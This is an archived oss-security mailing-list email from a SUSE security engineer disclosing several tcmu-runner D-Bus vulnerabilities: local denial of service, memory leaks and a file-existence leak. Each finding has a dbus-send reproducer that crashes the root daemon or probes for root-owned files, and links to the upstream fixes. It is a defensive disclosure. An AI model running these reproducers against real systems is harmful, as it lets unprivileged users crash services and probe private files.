X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7999" "Monday" "24" "July" "2017" "12:12:04" "+0200" "Matthias Gerstner" "mgerstner@suse.de" "<20170724101204.GA22772@f195.suse.de>" "222" "[oss-security] tcmu-runner: multiple vulnerabilities in tcmu-runner daemon allowing local DoS, information leak and a memory leak" "^Date:" nil nil "7" "2017072410:12:04" "[oss-security] tcmu-runner: multiple vulnerabilities in tcmu-runner daemon allowing local DoS, information leak and a memory leak" (number mark "        mgerstner@su Jul 24  222/7999  " thread-indent "\"[oss-security] tcmu-runner: multiple vulnerabilities in tcmu-runner daemon allowing local DoS, information leak and a memory leak\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3416 invoked by uid 550); 24 Jul 2017 10:17:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30606 invoked from network); 24 Jul 2017 10:12:16 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20170724101204.GA22772@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha1;
	protocol="application/pgp-signature"; boundary="/04w6evG8XlLl3ft"
Content-Disposition: inline
User-Agent: Mutt/1.5.24 (2015-08-30)
Date: Mon, 24 Jul 2017 12:12:04 +0200
From: Matthias Gerstner <mgerstner@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] tcmu-runner: multiple vulnerabilities in tcmu-runner daemon allowing
 local DoS, information leak and a memory leak
To: oss-security@lists.openwall.com

--/04w6evG8XlLl3ft
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

A security audit of tcmu-runner's D-Bus service implementation showed a
number of security issues.

I've requested CVEs for these issues, request is still pending. I will
update once I've got them.

It seems upstream will remove the D-Bus interface completely from the
tcmu-runner daemon in the future.

Package: https://github.com/open-iscsi/tcmu-runner

------------------------------------------------------------------------
glfs handler allows local DoS via crafted CheckConfig strings
------------------------------------------------------------------------

Description:

A local non-root user with access to the D-Bus system bus can call the
CheckConfig method implemented in the tcmu-runner daemon via
handler_glfs.so and cause various kinds of segmentation faults,
depending on the string passed to the method.

For example the "hosts" variable in glfs_check_config() is not zero
initialized, but always freed on error, causing invalid free and/or
invalid memory accesses.

References:

- The check_config callback implementation was recently removed upstream
  in this commit:

  https://github.com/open-iscsi/tcmu-runner/commit/61bd03e600d2abf309173e91=
86f4d465bb1b7157

- SUSE bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=3D1049485

Reproducer:

# start the tcmu-runner service as root
systemctl restart tcmu-runner.service
# run this dbus command as a regular user
dbus-send --system --print-reply --dest=3Dorg.kernel.TCMUService1 /org/kern=
el/TCMUService1/glfs org.kernel.TCMUService1.CheckConfig string:something
# -> tcmu-runner daemon will have crashed with segmentation fault

------------------------------------------------------------------------
UnregisterHandler dbus method in tcmu-runner daemon for non-existing
handler causes DoS
------------------------------------------------------------------------

Description:

A local non-root user with access to the D-Bus system bus can call the
UnregisterHandler method implemented in the tcmu-runner daemon with the
name of an unknown tcmu runner handler as parameter and cause a NULL
pointer dereference.

References:

- upstream fix: https://github.com/open-iscsi/tcmu-runner/commit/e2d9530507=
66ac538615a811c64b34358614edce
- SUSE bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=3D1049488

Reproducer:

# start the tcmu-runner service as root
systemctl restart tcmu-runner.service
# run this dbus command as a regular user
dbus-send --system --print-reply --dest=3Dorg.kernel.TCMUService1 /org/kern=
el/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.Unr=
egisterHandler string:fake_handler
# -> tcmu-runner daemon will have crashed with segmentation fault



------------------------------------------------------------------------
UnregisterHandler D-Bus method in tcmu-runner daemon for internal
handler causes DoS
------------------------------------------------------------------------

Description:

A local non-root user with access to the D-Bus system bus can call the
UnregisterHandler method implemented in the tcmu-runner daemon with the
name of a handler loaded internally in tcmu-runner via dlopen() and
cause a NULL pointer dereference resulting in DoS.

References:

- upstream fix: https://github.com/open-iscsi/tcmu-runner/commit/bb80e9c7a7=
98f035768260ebdadffb6eb0786178
- SUSE bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=3D1049489

Reproducer:

# start the tcmu-runner service as root
systemctl restart tcmu-runner.service
# run this dbus command as a regular user, it will attempt to unregister the
# locally loaded qcow handler
dbus-send --system --print-reply --dest=3Dorg.kernel.TCMUService1 /org/kern=
el/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.Unr=
egisterHandler string:qcow
# -> tcmu-runner daemon will have crashed with segmentation fault


------------------------------------------------------------------------
Memory leaks can be triggered in tcmu-runner daemon by calling D-Bus
method for (Un)RegisterHandler
------------------------------------------------------------------------

Description:

A local non-root user with access to the D-Bus system bus can call the
RegisterHandler or UnregisterHandler methods implemented in the
tcmu-runner daemon to trigger memory leaks. Done so repeatedly would
cause a root daemon to hog memory, possibly resulting in DoS for the
daemon itself or other system components that fail to acquire memory as
a result.

References:

- upstream fix: https://github.com/open-iscsi/tcmu-runner/commit/7a78eda52d=
973d3edc06fea84ad874678d6055f0
- SUSE bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=3D1049490

Reproducer:

# *stop* the tcmu-runner service as root
systemctl restart tcmu-runner.service
# run the tcmu-runner service as root in valgrind
valgrind --max-stackframe=3D2097208 --leak-check=3Dfull /usr/bin/tcmu-runner
# run this dbus command multiple times as a regular user (this will trigger
# the leak in RegisterHandler)
dbus-send --system --print-reply --dest=3Dorg.kernel.TCMUService1 /org/kern=
el/TCMUService1/HandlerManager1 org.kernel.TCMUService1.HandlerManager1.Reg=
isterHandler string:0memory string:stuff
# ctrl-c the valgrind process and you'll see an amount of "definitely lost"
# bytes. when doing the same without the dbus-send calls this sould be zero
# "definitely lost" bytes



------------------------------------------------------------------------
qcow handler opens up an information leak via the CheckConfig D-Bus
method
------------------------------------------------------------------------

Description:

A local non-root user with access to the D-Bus system bus can call the
CheckConfig method implemented in the tcmu-runner daemon via
handler_qcow.so and exploit an information leak by passing in arbitrary
filenames to check.

This allows a local user to check for the existence of root owned files,
which might enable more serious security issues in combination with
other security flaws in a system.

References:

- upstream fix:

  This one is difficult to fix, upstream asked me to remove all
  check_config callbacks instead:

  https://github.com/open-iscsi/tcmu-runner/commit/8cf8208775022301adaa59c2=
40bb7f93742d1329

- SUSE bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=3D1049491

Reproducer:

# start the tcmu-runner service as root
systemctl restart tcmu-runner.service
# run this dbus command as a regular user
dbus-send --system --print-reply --dest=3Dorg.kernel.TCMUService1 /org/kern=
el/TCMUService1/qcow org.kernel.TCMUService1.CheckConfig string://root/.bas=
h_history
# this will return True if /root/.bash_history exists, False otherwise

Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Telefon: +49 911 740 53 290

SUSE Linux GmbH=20
GF: Felix Imend=F6rffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nuernberg)

--/04w6evG8XlLl3ft
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Digital signature

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBAgAGBQJZdcf0AAoJEBTEBclxkjVTJCYQAJ12Tf/Gjz27gU+L58Ki12Te
RSoZIA0JUjurNmRe+3bWXkNl8p0HN9ARPISCRnCeOp6yWGR7PQYjPDbDRO2LT/Oe
7TXVzjQ/TrbLNwFfgobeVsc42+WSf5acvsL9ugopcgiHWURFBye8Ap1HHqKB7pBN
B7GmRUCZCeJSuKaHJ4PyPN5MCKjlcEm+ywoC5ucKb1MkFh3/SrLzMJm0Z3FLCLGS
sVGeEmYjOogfadtp5y826slnTj6GWSYDdbuz1oyKdx/F1KgwtbSw1Z3p6GnhGLLl
drJ8s9P1YhgZ+589EHg6c1drz/r+HjWtgITZCdtr3ngT/3c/RnVgShAzJmAarzKU
Mz0qq7wtO/qbWwusjcAmFM31R876+K2mScXiah1dCc6YH/cvsIBy4oAR6Q+KX5FH
FUf8jIyoI91sm8mINn4s6XWfe3hEtGFgq2isIgzE7dcesSsmRBrbAEoSpOA2ofve
2SRtSFDor/B9tI539gwWZj3cPZxyEIznxa1waBJsZgQvAv6U7HSuLTEBd60FtC04
wM8mE3JCluyT+UfE9CYZr7TIwkImWh3eyzFjtiXhp7fFH711guLGYNuO9bcDn8LM
YxhJiqtYDziJM1llxVlungSwxB5griaYgY1z8RG6n0xYaJt8T6M6UHTSxKjqwUH5
WNe1lruqlAGAnjqxKQ58
=+BnL
-----END PGP SIGNATURE-----

--/04w6evG8XlLl3ft--
